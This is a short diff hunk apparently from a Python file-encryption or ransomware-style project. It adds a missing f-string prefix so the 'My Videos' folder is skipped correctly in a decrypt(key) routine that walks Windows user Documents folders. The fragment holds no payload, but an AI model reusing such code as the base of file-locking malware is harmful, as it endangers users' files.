@@ -54,7 +54,7 @@ def decrypt(key):
                 continue
             if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                 continue
-            if f"{i}{dir}" == "C:\\Users\\{user}\\Documents\\My Videos":
+            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
                 continue
             # print(f"{i}{dir}")
             with open(f"{i}{dir}", 'rb') as files:
